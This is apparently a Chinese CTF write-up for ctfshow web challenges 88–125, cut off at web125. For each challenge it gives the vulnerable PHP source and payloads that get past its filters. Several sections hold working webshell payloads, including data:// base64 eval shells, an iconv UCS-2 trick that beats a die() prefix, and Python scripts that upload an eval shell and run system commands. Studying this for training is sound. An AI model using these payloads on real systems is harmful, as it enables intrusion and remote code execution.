## web88（未过滤:号，data://协议构造不包含=号的base64）

```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){
        die("error");
    }
    include($file);
}
```

倒是变得简单了，过滤了php，但没过滤data，所以使用data伪协议，但因为过滤了php所以我们使用base64编码一下,另外主要是data协议构造base64的时候必须要求不含=和+号，多试几次构造一下，在结尾?>后添加字符消除=
payload如下

```php
1. data://text/plain;base64,PD9waHAgZXZhbCgkX0dFVFsnY21kJ10pO3BocGluZm8oKTskX0dFVDs/PjEx&cmd=system('tac+fl0g.php');
//data://text/plain;base64,<?php eval($_GET['cmd']);phpinfo();$_GET;?>11&cmd=system('tac+fl0g.php');

2.?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4
//<?php system('tac fl0g.php'); ?>
```

## web116 本地文件包含

抓包，猜测参数file，包含flag.php即可

## web117(绕过file_put_content()死亡exit())

```php
<?php 
highlight_file(__FILE__);
error_reporting(0);
function filter($x){
    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){
        die('too young too simple sometimes naive!');
    }
}
$file=$_GET['file'];
$contents=$_POST['contents'];
filter($file);
file_put_contents($file, "<?php die();?>".$contents);
```

这题和前面的有点类似，也是绕过contents前面的死亡代码，只是把一些可利用的协议和编码给ban了，但还可以利用其它编码器进行绕过

> convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用
> `iconv ( string $in_charset , string $out_charset , string $str )`：将字符串`$str`从`in_charset`编码转换到`$out_charset`
> 这里引入usc-2的概念，作用是对目标字符串每两位进行一反转，值得注意的是，因为是两位所以字符串需要保持在偶数位上

```php
$result = iconv("UCS-2LE","UCS-2BE", '<?php @eval($_POST[dotast]);?>');
echo "经过一次反转:".$result."\n";
echo "经过第二次反转:".iconv("UCS-2LE","UCS-2BE", $result);

//输出结果如下：
//经过一次反转:?<hp pe@av(l_$OPTSd[tosa]t;)>?
//经过第二次反转:<?php @eval($_POST[dotast]);?>
```

可以看到，经过两次反转之后代码又组装回来，思路就是用经过一次反转后的webshell和死亡代码`<?php die();?>`一起组合之后，经过第二次反转我们的webshell就恢复正常了，而死亡代码会被反转打乱不能执行
所以payload也就出来了，把前面的脚本改一下即可

```python
#-- coding:UTF-8 --
# Author:dota_st
# Date:2021/2/21 12:29
# blog: www.wlhhlc.top
import requests

url = "http://8a412388-9727-4ea0-8b0d-1f144f2d1a87.chall.ctf.show:8080/"
get_data = "php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=dotast.php"
get_url = url + "?file=" + get_data
data = {
    'contents': '?<hp pe@av(l_$OPTSd[tosa]t;)>?'
}
res = requests.post(url=get_url, data=data)
shell_url = url + "dotast.php"
test = requests.get(shell_url)
if(test.status_code == 200):
    print("[*]getshell成功")
    shell_data = {
        'dotast': 'system("cat flag.php");'
    }
    result = requests.post(url=shell_url, data=shell_data)
    print(result.text)
```

运行即可拿到flag

# 0x04 php特性

## web89（intval()数组绕过）

```php
<?php

include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
}
```

要求num中不能出现数字，而且intval后为不为0，这里要了解一下intval这个函数，它是用来获取变量的整形值，

成功时返回 var 的 integer 值，失败时返回 0。 

空的 array 返回 0，非空的 array 返回 1。

所以思路就很明确了,两种构造

```php
?num[]=   //做空数组返回0，符合
或者
?num[]=2  //非空，处理失败，返回0，符合
```



## web90（intval()进制绕过）

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

要求num不能等于字符串4476，而且十进制的整型值要为4476，继续考察intval的使用，多补充点知识

> int intval ( mixed $var [, int $base = 10 ] )
>
> 如果 base 是 0，通过检测 var 的格式来决定使用的进制：
>
> - 如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，
> - 如果字符串以 “0” 开始，使用 8 进制(octal)；否则，
> - 将使用 10 进制 (decimal)。

payload：

```php
/?num=010574（前加0表示8进制）
/?num=0x117c（前加0x表示16进制）
/?num=0b1000101111100（前加0b表示2进制 php5.4+）
/?num=4476.1
    
其他办法：因为我们提交的参数值默认就是字符串类型 所以我们可以直接输入
?num=+4476
?num=4476%23
?num=4476%27等，上面$num==="4476"强比较，4474!=4476#等，下面intval()强制转换，舍弃了非合法字符
```

![image-20231112084330935](assets/image-20231112084330935.png)

## web91（preg_match()多行模式，%0a绕过）

```php
<?php

show_source(__FILE__);
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}
```

第一个if需要匹配到php，而第二个if如果匹配到php就会输出hacker，绕过需要不让它匹配到，这里有一个正则匹配的知识点

> /i表示匹配大小写
> 字符 ^ 和 $ 同时使用时，表示精确匹配，需要匹配以php开头和以php结尾
> /m 多行匹配 若存在换行\n并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配
> 但是当出现换行符 `%0a`的时候，$cmd的值会被当做两行处理，而此时第二个if正则匹配不符合以php开头和以php结尾

```php
?cmd=%0aphp
?cmd=php%0a
```



## web92（intval()进制、小数、e绕过绕过）

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

要求num值不为数字4476，同时intval()转化十进制值为4476，同样也可以用16进制等绕过
payload：

```php
?num=0x117c
?num=4476.1
?num=4476e1
```


## web93（intval()小数、进制绕过）

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

与上一题大同小异，不过过滤了num中的字母，这样2进制和16进制都不能用，只能使用8进制，小数
payload：/

```php
?num=010574
?num=4476.1
```


## web94（%0a绕过）

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

这次变成强比较，并且多加了一个strpos函数

> **strpos()** 函数查找字符串在另一字符串中第一次出现的位置
>
> ```
> CODE
> strpos(string,find,start)
> ```
>
> | 参数     | 描述                       |
> | :------- | :------------------------- |
> | *string* | 必需。规定要搜索的字符串。 |
> | *find*   | 必需。规定要查找的字符串。 |
> | *start*  | 可选。规定在何处开始搜索。 |
>
> 返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。
>
> **注释**：字符串位置从 0 开始，不是从 1 开始。

因为八进制需要开头指定为0，而strpos()会匹配到返回0，!0也就是1得执行die，我们可以在前面加个空格，这样strpos()会返回1，所以我们把4476转换为8进制10574后，前面再加一个空格即可，payload为

换行符绕过即可，相当于填充了一个字符，除此之外，分页符%0c，制表符%09都是可以的
payload：/

```php
?num= 010574
?num=%0a010574
?num=%0c010574
?num=%09010574
或者直接小数点绕过
?num=4476.0
```



## web95（%0a绕过）

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

多过滤了点，但不影响上一题的payload
payload：/

```
?num=%0a010574
小数点不能用了
?num=+010574
?num=%2b010574
```


## web96（同路径绕过）

```php
<?php

highlight_file(__FILE__);

if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }

}

```

明显flag在flag.php中，但是又不能直接传入flag.php，已知flag在当前目录下，所以构造
payload：

```
?u=./flag.php
?u=php://filter/read=convert.base64-encode/resource=flag.php
```


## web97（md5强碰撞绕过）

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if (isset($_POST['a']) and isset($_POST['b'])) {
  if ($_POST['a'] != $_POST['b'])
    if (md5($_POST['a']) === md5($_POST['b']))
      echo $flag;
  else
    print 'Wrong.';
}
?>
```

要求传入a和b不等而md5值相等，小知识点，可以传入数组，md5后值为NULL，那么自然NULL=NULL满足条件
payload：

```php
a[]=1&b[]=2
a[]=1&b[]=1也可以？？？？

思路二：两个不用的明文各自经过MD5加密后，得到相等的hash值
测试不行，可能只有GET传参有用吧
Payload：a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```


## web98（三元运算符和传址）

```php
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
```

这里是三目运算符和取地址，第二行和第三行是无用的，因为用不到，所以我们分析一下第一行和第四行

> 第一行：如果存在get传参，则把post传参地址给get，可以简单理解为post覆盖了get
> 第四行，如果get参数`HTTP_FLAG`的值为flag，就读取文件，也就是输出flag

所以思路也就出来了，payload为

```
GET：/?1=1
POST：HTTP_FLAG=flag
```



## web99（in_array）

```php
<?php

highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}

?>
```

这个题考察in_array函数，它没有设置第三个参数，默认是false，即不会检查类型是否相同，所以对于1和1.php的判断是等效的，那么就可以创建一个php文件，然后写入一句话木马
payload：

```
GET：/?n=1.php
POST：content=<?=eval($_POST['lpp']);?>
```

然后上蚁剑也行网页直接读也行，我这里选择直接读，在1.php界面
payload：KonDream=system('tac flag*');
![image.png](assets/1637938584200-b51eab6d-2608-4ce0-80bb-62dc81c1d310.png)

脚本跑

```python
import requests
url = "http://5922e022-e938-4ec4-905f-0ccd7cf07cdf.chall.ctf.show:8080/"
w_url = url + "?n=123.php"
data1 = {
    'content': '<?php @eval($_POST[lpp]);?>'
}
get_shell = requests.post(url=w_url, data=data1)
shell_url = url + "123.php"
get_test = requests.get(url=shell_url)
if(get_test.status_code==200):
    print("写入shell成功")
    data2={
        'lpp': 'system("cat flag36d.php");'
    }
    res = requests.post(url=shell_url, data=data2)
    print(res.text)
```



## web100（优先级）

```php
<?php

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
}
?>
```

很多人对第10行有一个误区啊，认为一定要v1v2v3都是数字才能满足v0=1，其实不然，在php中赋值的优先级是要比与运算高的，也就是说只要满足v1是数字v0就会被赋值为1，v2v3是什么并不影响v0；其次第5行说falg在ctfshow类里，那么其实可以v2就直接new一个ctfshow然后打印，php仍会执行，不要被第14行误导；最后v3传个分号满足判断条件即可
最后要注意将得到的flag中的0x2d换位-，因为0x2d对应的字符就是-，同时ctfshow的flag格式都是有-的，也算是一个小坑了
payload：/

```
?v1=1&v2=var_dump(new ctfshow)&v3=;
?v1=21&v2=var_dump($ctfshow)/*&v3=*/;
/?v1=1&v2=system("cp+ctfshow.php+1.txt")?>&v3=;
```



## web101（php类反射应用Reflectionclass）

```php
<?php

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }   
}
?>
```

```php
PHP Reflection API是PHP5才有的新功能，它是用来导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。
$class = new ReflectionClass(‘ctfshow’); // 建立 Person这个类的反射类
$instance = $class->newInstanceArgs($args); // 相当于实例化ctfshow类
```

主要过滤了v2的右括号，很多函数不能用了，这里考虑php的反射类，拼接而成报告ctfshow类的信息。需要注意的是，除了替换0x2d外，题目还少给了一位flag，那么就需要爆破最后一位字符0-f16次即可
payload：/

```
?v1=1&v2=echo new Reflectionclass&v3=;
```



## web102（巧妙的构造）

```php
<?php

highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}

?>
```

首先继续了解几个函数

> **is_numeric()** 函数用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回true，否则返回false。如果字符串中含有一个e代表科学计数法，也可返回true
>
> **call_user_func()** 函数用于调用方法或者变量，第一个参数是被调用的函数，第二个是调用的函数的参数
>
> **file_put_contents()** 函数应该都熟悉了，写入内容到文件中，第一个参数是文件名，第二个参数是内容

首先，get传参v2和v3，post传参v1；if中需要v4为真才能往下执行，而v4要为真就是v2传的参数要为数字或者数字字符串，同时v2也是我们要写入的webshell
为了让v2为数字或者数字字符串，我们可以先把我们的webshell转换为base64编码，再把base64编码转换为16进制，这是一种办法去转换成数字

```php
<?php
$b = base64_encode('<?=`tac *`;');
$b = str_replace("=","",$b);
echo "base64加密后:".$b."\n";
$a = call_user_func('bin2hex',$b);
echo "16进制形式:".$a."\n";
var_dump(is_numeric($a));

/*运行结果
base64加密后:PD89YHRhYyAqYDs
16进制形式:504438395948526859794171594473
bool(true)
*/
```

说明：**<?=是php的短标签，是echo()的快捷用法**
**还有一点，就是substr()取得是从下标为2开始的字符串，我们在前面加00两位数**
所以payload为

```php
?v2=00504438395948526859794171594473&v3=php://filter/write=convert.base64-decode/resource=dotast.php

post:
v1=hex2bin
```

解着再访问dotast.php即可得到flag

## web103（巧妙的构造）

```php
<?php

highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    if(!preg_match("/.*p.*h.*p.*/i",$str)){
        file_put_contents($v3,$str);
    }
    else{
        die('Sorry');
    }
}
else{
    die('hacker');
}

?>
```

这次不允许str中出现任何带有php的字符，影响不大，解法同上
payload：
GET：

```php
/?v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=2.php
POST：v1=hex2bin
```

加载2.php后查看源代码即可

## web104（sha1弱碰撞绕过）

```php
<?php

highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2)){
        echo $flag;
    }
}
?>
```

说是sha1碰撞其实也和md5碰撞一样，毕竟都是哈希加密嘛，严格来说也不是碰撞，只是利用php特性来做而已，真要能碰撞出来我直接载入史册hhh（其实我是个正经人儿）
回归正题

### 法一：数组绕过

```php
GET：/?v2[]=2
POST：v1[]=1
```

不用数组也行，弱碰撞嘛，找到两个加密后以0e开头并且接下来30位都是数字的就行了，因为php会把0e开头的解析成科学计数法，全是数字的话直接为0，就满足相等条件，这里给两个例子：

```php
aaK1STfY 0e76658526655756207688271159624026011393
aaO8zKZF 0e89257456677279068558073954252716165668
```

补充：其实这题也是没啥可碰撞的，v1和v2传个一样的值就行了= =。

```
v1=1  v2=1
```



## web105（变量覆盖）

```php
<?php

highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);

?>
你还想要flag嘛？
```

这题考察变量覆盖，主要是读懂$$key=$$value; 比如说我GET请求flag=a，那么会有如下变换：
第一步$key=flag；第二步$$key即$flag=$a，就相当于用$a的值把$flag的值给替换掉了。
这题$flag没有直接输出点，所以要通过第20行的die($error);或者第23行的die($suces);来输出，也就是说用$flag覆盖掉这两个其中一个的值。
那么思路就很明确了，首先GET请求/?a=flag，按照上面的理论，相当于$a=$flag，也就是说这个变量a的值就是答案flag，此时直接执行会发现请求了第20行die($error); 因为没有POST。那么我们再将error的值覆盖掉就好了，于是POST请求error=a，相当于$error=$a，而$a的值又是$flag的值，那么此时的输出就是$flag了，有一点绕，需要多读几遍理解。
最终payload：

**第一种：**

```
GET：/?a=flag
POST：error=a
```

**第二种：**
通过die($suces)输出flag，首先我们把flag的值传给suces变量，接着再把flag的值给置空，已达到下面if条件为0不执行的目的，往下执行，die($suces)即可把flag输出

```
?suces=flag&flag=
?suces=flag
post:flag=
```

## web106（sha1弱碰撞）

```php
<?php

highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2) && $v1!=$v2){
        echo $flag;
    }
}
?>
```

还是弱碰撞，数组绕过
GET：/?v2[]=2
POST：v1[]=1

## web107（parse_str()函数特性，md5弱碰撞）

```php
<?php

highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);
       if($v2['flag']==md5($v3)){
           echo $flag;
       }
}

?>
```

乍一看什么玩意，v2呢，仔细一看看错了，parse_str就是查询字符串并解析到变量里，第一个参数v1是要解析的字符串，第二个参数v2可选，意味存储变量的数组，所以就简单了，md5弱碰撞绕过

首先需要传一个get参数`v3`和一个post参数`v1`，注意到一个函数parse_str()

> ```
> parse_str(string,array)
> ```
>
> | 参数     | 描述                                                         |
> | :------- | :----------------------------------------------------------- |
> | *string* | 必需。规定要解析的字符串。                                   |
> | *array*  | 可选。规定存储变量的数组的名称。该参数指示变量将被存储到数组中。 |

举例

```php
PHP
$a = "name=dotast&age=666";
parse_str($a,$b);
echo $b['name']."\n";
echo $b['age'];

#输出结果
//dotast
//666
```

```php
GET：/?v3=QNKCDZO
POST：v1=flag=0
v3经过md5解密后为0e开头的纯数字，会被php当做科学计数法解析成0；v1中字符串会被解析到数组v2中，即v2[flag]=0，0=0满足条件，执行输出。

?v3=dotast
post:
v1=flag=208f1b1289da972682cbc81c8684fcc8
```



## web108（ereg()正则函数存在NULL截断）

```php
<?php

highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');
}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}

?>
```

> 首先了解一下几个函数
>
> > **ereg()** 函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回true，否则返回false。搜索对于字母字符是区分大小写的
> >
> > **strrev()** 函数反转字符串。
> >
> > **intval()** 函数用于获取变量的整数值
>
> 首先需要知道%00可以截断ereg()函数的搜索，正则表达式只会匹配%00之前的内容；0x36d的十进制内容为877，我们需要字母在前来满足if条件的正则匹配来跳过if语句，接着再进行字符串的反转得到877a，接着intval()函数取整数部分得到877

首先需要GET参数，参数的值要是0x36d，包含字母，且参数要反向。通过计算：0x36d=(877)D，反向后是778，最后使用%00截断

即：payload:?c=a%00778

**执行GET请求时会默认进行一次URL解码，由于%00是一个不可见字符，c的值实际是a(invisible)778。经过ereg()截断，前部分a通过匹配返回1，不会die('error')。再反向取值，0x36d比较后部分的877返回1，从而echo $flag**

## web109（内置类、反射类）

```php
<?php

highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }
}
?>
```

这里传入两个参数，并且都需要有字母，我们用php内置类让v1不进行报错，v2执行我们的命令就好了

> **Exception** 处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类
>
> **ReflectionClass** 或者 **ReflectionMethod** 都为常用的反射类，可以理解为一个类的映射

```php
?v1=Exception&v2=system('tac fl36dg.txt')
或者
?v1=ReflectionClass&v2=system('tac fl36dg.txt')
或者
?v1=ReflectionMethod&v2=system('tac fl36dg.txt')
或者
用匿名类绕过 ?v1=class{ public function __construct(){ system('ls'); } };&v2=a
```

## web110（php内置类FilesystemIterator 获取指定目录下的所有文件）

```php
<?php


highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }

    eval("echo new $v1($v2());");

}
?>
```

考察：php内置类 

```
利用 FilesystemIterator 获取指定目录下的所有文件
getcwd()函数 获取当前工作目录 返回当前工作目录 
payload: ?v1=FilesystemIterator&v2=getcwd
最后访问fl36dga.txt即可
```



## web111（变量覆盖）

```php
<?php
  
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}


if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }
}
?>
```

这次依然考点在于变量覆盖(知识点忘记的话去温习一下web105)，首选需要`v1`含有ctfshow才能过正则，执行getflag函数，所以`v1=ctfshow`，接着再getflag函数里，会把v2的地址传给v1，接着再输出v1，这里我们可以使用php里的全局变量GLOBALS

> $GLOBALS — 引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。

所以payload为

```
?v1=ctfshow&v2=GLOBALS
如果不限制_号，不妨试试
?v1=ctfshow&v2=_ENV
```

过程就是`$ctfshow=&$GLOBALS`(全局变量中会含有flag的变量)，接着再通过var_dump输出$ctfshow

## web112（php://filter以及死亡绕过）

```php
<?php

highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

payload

1. ```php
   1. /?file=php://filter/read/resource=flag.php
   1. /?file=php://filter/convert.iconv.UCS-2LE.UCS-2LE/resource=flag.php
   
   这个过滤器需要php支持 iconv ，而iconv是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。
   iconv — 字符串按要求的字符编码来转换
   UCS-2LE是小端每个字节两位存储，UCS-2LE.UCS-2LE表示小端输入，小端输出
   
   3. /?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php
   
   convert.quoted-printable-encode和convert.quoted-printable-decode使用此过滤器的decode版本等同于用 quoted_printable_decode()函数处理所有的流数据。没有和convert.quoted-printable-encode相对应的函数。convert.quoted-printable-encode支持以一个关联数组给出的参数。除了支持和convert.base64-encode一样的附加参数外，convert.quoted-printable-encode还支持布尔参数binary和 force-encode-first。convert.base64-decode只支持line-break-chars参数作为从编码载荷中剥离的类型提示。
   
   4. /?file=compress.zlib://flag.php 压缩过滤器
   ```

## web113（php://filter以及死亡绕过）

```php
<?php

highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

过滤了filter，使用压缩过滤器绕过
payload：/

```
?file=compress.zlib://flag.php

?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```


## web114（php://filter以及死亡绕过）

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
function filter($file){
    if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
echo "师傅们居然tql都是非预期 哼！";
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
} 师傅们居然tql都是非预期 哼！
```

又不过滤filter了
payload：

```
/?file=php://filter/read/resource=flag.php
```


## web115（%0c绕过）

```php
<?php

include('flag.php');
highlight_file(__FILE__);
error_reporting(0);
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
}
$num=$_GET['num'];
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
    if($num=='36'){
        echo $flag;
    }else{
        echo "hacker!!";
    }
}else{
    echo "hacker!!!";
} hacker!!!
```

这里用了is_numeric来判断是不是数字，并且if条件里规定trim($num)移除字符串两侧的字符不能等于36，但后面的if需要等于36才能输出flag，而且自定义函数filter也把16进制和8进制等等封死了，我们写个脚本看看有什么字符可以利用

```php
PHP
<?php
for ($i = 0; $i <= 128; $i++) {
    $a = chr($i) . '36';
    if (trim($a) !== '36' && is_numeric($a)) {
        echo urlencode(chr($i)) . "\n";
    }
}
```

发现`%0C`，也就是`\f`分页符可以利用，不会被trim过滤掉，所以payload为

```php
CODE
?num=%0c36
```

## web123（变量名特性变化）

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>
```

看到后面有个eval()函数会执行`$c`，所以我们就关注$c和if判断需要的两个post即可
在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有`空格、+、[`则会被转化为`_`，所以按理来说我们构造不出`CTF_SHOW.COM`这个变量(因为含有`.`)，但php中有个特性就是如果传入`[`，它被转化为`_`之后，后面的字符就会被保留下来不会被替换，所以payload为

```php
CTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag
```


## web125（POST转GET逃逸）

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
